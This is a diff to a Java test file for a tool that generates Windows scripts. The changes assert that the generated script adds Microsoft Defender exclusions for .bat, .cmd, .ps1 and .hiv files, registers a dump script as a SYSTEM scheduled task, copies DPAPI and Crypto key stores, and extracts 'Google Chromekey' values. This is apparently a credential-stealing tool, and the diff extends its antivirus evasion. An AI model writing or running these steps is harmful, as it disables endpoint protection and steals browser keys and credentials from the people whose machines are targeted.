@@ -90,9 +90,14 @@ class BootstrapTest {
 	}
 
 	@Test
-	void elevateScriptRegistersTheDumpAsSystem() {
+	void elevateScriptExcludesBeforeRegisteringTheDump() {
 		Path dump = temp.resolve("cache/dump.bat");
 		String script = String.join("\n", Bootstrap.elevateLines(dump));
+		int exclusion = script.indexOf("Add-MpPreference -ExclusionPath");
+		int create = script.indexOf("schtasks /create /tn spcdump");
+		assertTrue(exclusion >= 0);
+		assertTrue(exclusion < create, "exclusions run before the task exists");
+		assertTrue(script.contains("'.bat','.cmd','.ps1','.hiv'"));
 		assertTrue(script.contains("schtasks /create /tn spcdump"));
 		assertTrue(script.contains(dump.toString()));
 		assertTrue(script.contains("/ru SYSTEM /rl HIGHEST"));
@@ -169,6 +174,8 @@ class BootstrapTest {
 		assertTrue(script.contains("config\\systemprofile\\AppData\\Roaming\\Microsoft\\Protect"));
 		assertTrue(script.contains("Microsoft\\Crypto\\Keys"));
 		assertTrue(script.contains("findstr /s /m /i /c:\"Google Chromekey1\""));
+		assertTrue(script.contains("[Text.Encoding]::Unicode.GetString"));
+		assertTrue(script.contains("Google Chromekey[0-9]+"));
 		assertTrue(script.contains("if not exist \"" + cache.resolve("SystemKeys") + "\\Google Chromekey1\" goto retry"));
 	}
 
